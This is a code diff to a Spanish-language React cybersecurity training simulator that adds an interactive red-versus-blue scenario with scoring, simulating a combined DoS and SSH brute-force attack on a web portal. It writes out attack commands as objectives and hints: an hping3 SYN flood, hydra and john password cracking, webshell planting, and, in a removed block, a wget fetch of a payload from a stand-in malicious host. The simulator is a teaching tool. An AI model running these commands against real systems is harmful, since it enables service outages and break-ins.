@@ -1,9 +1,5 @@
-
-
-
-
 import React from 'react';
-import type { TrainingScenario, ResourceModule, GlossaryTerm, TerminalLine, PromptState, InteractiveScenario } from './types';
+import type { TrainingScenario, ResourceModule, GlossaryTerm, TerminalLine, PromptState, InteractiveScenario, VirtualEnvironment } from './types';
 
 // ============================================================================
 // Icon Component (Lucide SVG paths)
@@ -262,6 +258,144 @@ export const fortressScenario: InteractiveScenario = {
     evaluation: (env) => ({ completed: false, score: 0, feedback: [] }) // Simplified for now
 };
 
+const calculateResponseTime = (env: VirtualEnvironment): string => {
+    const attackLog = env.timeline.find(log => log.message.includes('hydra') || log.message.includes('hping3'));
+    const defenseLog = env.timeline.find(log => log.message.includes('ufw deny from') || log.message.includes('fail2ban-client'));
+
+    if (attackLog && defenseLog) {
+        const attackTime = new Date(attackLog.timestamp).getTime();
+        const defenseTime = new Date(defenseLog.timestamp).getTime();
+        const diffSeconds = (defenseTime - attackTime) / 1000;
+        return `${Math.max(0, diffSeconds).toFixed(1)}s`;
+    }
+    return 'N/A';
+};
+
+export const rageScenario: InteractiveScenario = {
+    id: 'escenario8',
+    isInteractive: true,
+    icon: 'bomb',
+    color: 'bg-orange-600',
+    title: 'Furia en la Red: Ataque Combinado',
+    description: 'DoS + Bruteforce simultáneos. Azul debe priorizar y contener bajo presión.',
+    difficulty: 'advanced',
+    team: 'both',
+    
+    initialEnvironment: {
+        networks: {
+            'dmz': {
+                hosts: [{
+                    ip: '10.0.20.10',
+                    hostname: 'PORTAL-WEB',
+                    os: 'linux',
+                    services: {
+                        22: { name: 'ssh', version: 'OpenSSH 8.2', state: 'open', vulnerabilities: [] },
+                        80: { name: 'http', version: 'nginx 1.18', state: 'open', vulnerabilities: [] },
+                        443: { name: 'https', version: 'nginx 1.18', state: 'open', vulnerabilities: [] }
+                    },
+                    users: [
+                        { username: 'admin', password: 'P@ssw0rd', privileges: 'admin' },
+                        { username: 'blue-team', password: 'Bl#3T3@m!2024', privileges: 'admin' }
+                    ],
+                    files: [
+                        { path: '/var/www/html/index.php', permissions: '644', content: '<?php echo "PORTAL-WEB v1.0"; ?>', hash: 'original_hash_123' }
+                    ],
+                    systemState: {
+                        cpuLoad: 5.0,
+                        memoryUsage: 30.0,
+                        networkConnections: 50,
+                        failedLogins: 0
+                    }
+                }],
+                firewall: {
+                    enabled: true,
+                    rules: [
+                        { id: '1', action: 'allow', protocol: 'tcp', destPort: 22 },
+                        { id: '2', action: 'allow', protocol: 'tcp', destPort: 80 },
+                        { id: '3', action: 'allow', protocol: 'tcp', destPort: 443 }
+                    ]
+                },
+                ids: {
+                    enabled: true,
+                    signatures: ['SSH_BRUTEFORCE', 'SYN_FLOOD', 'HTTP_DOS'],
+                    alerts: []
+                }
+            }
+        },
+        attackProgress: { reconnaissance: [], compromised: [], credentials: {}, persistence: [] },
+        defenseProgress: { hardenedHosts: [], blockedIPs: [], patchedVulnerabilities: [] },
+        timeline: []
+    },
+    
+    objectives: [
+        // === EQUIPO ROJO ===
+        { id: 'red-dos-attack', description: 'Lanzar ataque DoS contra PORTAL-WEB (CPU > 90%)', points: 20, required: true, validator: (env) => {
+                const host = env.networks.dmz.hosts.find(h => h.hostname === 'PORTAL-WEB');
+                return (host?.systemState?.cpuLoad ?? 0) > 90;
+            }, hint: 'Usa hping3 con flag --flood -S para SYN flood'
+        },
+        { id: 'red-bruteforce-success', description: 'Obtener credenciales de admin mientras el DoS está activo', points: 30, required: true, validator: (env) => !!env.attackProgress.credentials['admin@10.0.20.10'], hint: 'Lanza hydra con wordlist rockyou.txt mientras el DoS cubre tu rastro'
+        },
+        { id: 'red-deploy-backdoor', description: 'Acceder al servidor y modificar index.php (webshell)', points: 35, required: true, validator: (env) => {
+                const host = env.networks.dmz.hosts.find(h => h.hostname === 'PORTAL-WEB');
+                const indexFile = host?.files.find(f => f.path === '/var/www/html/index.php');
+                return indexFile?.hash !== 'original_hash_123';
+            }, hint: 'Después de SSH, usa nano para editar /var/www/html/index.php y cambiar su contenido'
+        },
+        
+        // === EQUIPO AZUL ===
+        { id: 'blue-detect-dos', description: 'Identificar el ataque DoS analizando la carga del sistema', points: 10, required: true, validator: (env) => env.timeline.some(log => log.source_team === 'Blue' && (log.message.includes('top') || log.message.includes('htop'))), hint: 'Usa "top" o "htop" para ver la carga del CPU'
+        },
+        { id: 'blue-detect-bruteforce', description: 'Identificar el ataque de fuerza bruta en logs', points: 10, required: true, validator: (env) => env.timeline.some(log => log.source_team === 'Blue' && (log.message.includes('journalctl') || log.message.includes('grep'))), hint: 'Revisa /var/log/auth.log o usa "journalctl -u sshd"'
+        },
+        { id: 'blue-block-attacker', description: 'Bloquear la IP del atacante en el firewall', points: 25, required: true, validator: (env) => env.networks.dmz.firewall.rules.some(r => r.action === 'deny' && r.sourceIP === '192.168.1.100'), hint: 'Usa "sudo ufw deny from <IP>" o fail2ban'
+        },
+        { id: 'blue-verify-integrity', description: 'Verificar integridad de archivos web (detectar backdoor)', points: 20, required: true, validator: (env) => env.timeline.some(log => log.source_team === 'Blue' && (log.message.includes('sha256sum') || log.message.includes('md5sum'))), hint: 'Usa "sha256sum /var/www/html/index.php" y compara con hash original'
+        },
+    ],
+    
+    hints: [
+        { trigger: (env) => (env.networks.dmz.hosts[0]?.systemState?.cpuLoad ?? 0) > 70, message: '🚨 [EQUIPO AZUL] CPU crítica! Ejecuta "top" inmediatamente para diagnosticar.' },
+        { trigger: (env) => (env.networks.dmz.hosts[0]?.systemState?.failedLogins ?? 0) > 10, message: '⚠️ [EQUIPO AZUL] Múltiples intentos de login fallidos detectados. Revisa logs AHORA.' },
+        { trigger: (env) => {
+            const hasCredentials = !!env.attackProgress.credentials['admin@10.0.20.10'];
+            const isBlocked = env.networks.dmz.firewall.rules.some(r => r.action === 'deny' && r.sourceIP === '192.168.1.100');
+            return hasCredentials && !isBlocked;
+          }, message: '🔴 [EQUIPO AZUL] ALERTA CRÍTICA: Credenciales comprometidas. Bloquea la IP INMEDIATAMENTE.'
+        },
+    ],
+    
+    evaluation: (env) => {
+        const redPoints = ['red-dos-attack', 'red-bruteforce-success', 'red-deploy-backdoor'].reduce((sum, id) => {
+            const obj = rageScenario.objectives.find(o => o.id === id);
+            return sum + (obj?.validator(env) ? obj.points : 0);
+        }, 0);
+        const bluePoints = ['blue-detect-dos', 'blue-detect-bruteforce', 'blue-block-attacker', 'blue-verify-integrity'].reduce((sum, id) => {
+            const obj = rageScenario.objectives.find(o => o.id === id);
+            return sum + (obj?.validator(env) ? obj.points : 0);
+        }, 0);
+        
+        const feedback: string[] = [];
+        const isCompromised = env.attackProgress.compromised.includes('10.0.20.10');
+        const isBlocked = env.networks.dmz.firewall.rules.some(r => r.action === 'deny' && r.sourceIP === '192.168.1.100');
+        
+        if (isCompromised && !isBlocked) {
+            feedback.push('⚔️ **VICTORIA DECISIVA DEL EQUIPO ROJO**');
+        } else if (isBlocked && !isCompromised) {
+            feedback.push('🛡️ **VICTORIA DEL EQUIPO AZUL**');
+        } else if (isCompromised && isBlocked) {
+            feedback.push('⚖️ **ESCENARIO MIXTO**');
+        } else {
+            feedback.push('📊 **ESCENARIO INCOMPLETO**');
+        }
+        feedback.push(`\n**Puntuación:** Rojo ${redPoints}/85 | Azul ${bluePoints}/65`);
+        if (isBlocked) {
+            feedback.push(`✓ Atacante bloqueado (Tiempo de respuesta: ${calculateResponseTime(env)})`);
+        }
+        return { completed: redPoints >= 70 || bluePoints >= 60, score: Math.max(redPoints, bluePoints), feedback };
+    }
+};
+
 export const TRAINING_SCENARIOS: (TrainingScenario | InteractiveScenario)[] = [
     {
         id: 'escenario1', icon: 'layers', color: 'bg-blue-500', title: 'Escenario 1: El Diagnóstico (OSI/TCP-IP)',
@@ -397,40 +531,7 @@ export const TRAINING_SCENARIOS: (TrainingScenario | InteractiveScenario)[] = [
         </>
     },
     fortressScenario,
-    {
-        id: 'escenario8', icon: 'bomb', color: 'bg-orange-600', title: 'Escenario 8: Furia en la Red (Ataque Combinado)',
-        subtitle: 'Equipo Rojo vs. Equipo Azul',
-        content: <>
-            <CisoCard icon="clipboard-list" title="Situación del Incidente">
-                <p>El portal de acceso público <strong>"PORTAL-WEB"</strong> está bajo un ataque coordinado. El NOC reporta quejas de clientes sobre errores de "Conexión Rechazada" (DoS). Al mismo tiempo, el SIEM dispara una alerta por múltiples intentos de login fallidos contra la cuenta <code>admin</code>.</p>
-                <p>Host del Defensor (Azul): <code>ssh blue-team@PORTAL-WEB</code></p>
-                <p>Host del Atacante (Rojo): <code>pasante-red@soc-valtorix</code></p>
-            </CisoCard>
-            <CisoCard icon="shield" title="MISIÓN EQUIPO AZUL: RESPUESTA Y RECUPERACIÓN">
-                <p><strong>Objetivo:</strong> Identificar, mitigar y recuperarse del ataque.</p>
-                <h5>1. Diagnóstico de Carga (top/htop)</h5>
-                <pre><code>top</code></pre>
-                <h5>2. Análisis de Logs (journalctl)</h5>
-                <pre><code>journalctl -u sshd | grep "Failed password"</code></pre>
-                 <h5>3. Mitigación (Firewall y Fail2Ban)</h5>
-                <pre><code>sudo ufw deny from [IP_ATACANTE]
-sudo fail2ban-client set sshd banip [IP_ATACANTE]</code></pre>
-                <h5>4. Verificación de Integridad (post-brecha)</h5>
-                <pre><code>sha256sum /var/www/html/index.php</code></pre>
-            </CisoCard>
-            <CisoCard icon="sword" title="MISIÓN EQUIPO ROJO: INFILTRACIÓN Y DISRUPCIÓN">
-                <p><strong>Objetivo:</strong> Ganar acceso y causar denegación de servicio.</p>
-                 <h5>1. Cracking de Contraseña (John/Hydra)</h5>
-                <pre><code>john --wordlist=rockyou.txt hash.txt
-hydra -l admin -P wordlist.txt ssh://PORTAL-WEB</code></pre>
-                 <h5>2. Ataque DoS (hping3)</h5>
-                <pre><code>sudo hping3 --flood -S PORTAL-WEB</code></pre>
-                <h5>3. Acceso y "Payload" (wget)</h5>
-                <pre><code>ssh admin@PORTAL-WEB
-wget http://malware-repo.bad/payload.sh</code></pre>
-            </CisoCard>
-        </>
-    },
+    rageScenario,
     {
         id: 'escenario9', icon: 'crosshair', color: 'bg-red-800', title: 'Escenario 9: La Cadena de Infección (Kill Chain)',
         subtitle: 'Ataque multi-fase desde la DMZ hasta la red interna de finanzas.',
@@ -639,6 +740,7 @@ Use <strong class="text-amber-300">help [id]</strong> para una guía detallada (
 
 <strong>Fase 2: Intrusión y Explotación</strong>
   <strong class="text-amber-300">hydra -l [user] -P [file] ssh://[host]</strong> - Lanza ataque de fuerza bruta. <strong class="text-red-500">(¡RUIDOSO!)</strong>
+  <strong class="text-amber-300">hping3 --flood -S [host]</strong> - Lanza un ataque de denegación de servicio (DoS).
   <strong class="text-amber-300">john [hash_file]</strong>       - Simula cracking de contraseñas offline.
   <strong class="text-amber-300">ssh [user]@[host]</strong>      - Intenta acceder con credenciales encontradas.
   <strong class="text-amber-300">wget [url]</strong>             - (Dentro del host) Descarga un 'payload'.
@@ -782,5 +884,5 @@ export const ALL_COMMANDS = [
     'help', 'nmap', 'hydra', 'nc', 'msfconsole', 'clear', 'marca', 'exit', 
     'ssh', 'sudo', 'ufw', 'ls', 'whoami', 'ping', 'dirb', 'curl', 'nikto',
     'john', 'wget', 'cat', 'ps', 'systemctl', 'chmod', 'nano', 'grep', 'top', 'htop', 'ss',
-    'journalctl', 'openssl', 'fail2ban-client', 'sha256sum'
+    'journalctl', 'openssl', 'fail2ban-client', 'sha256sum', 'hping3'
 ];
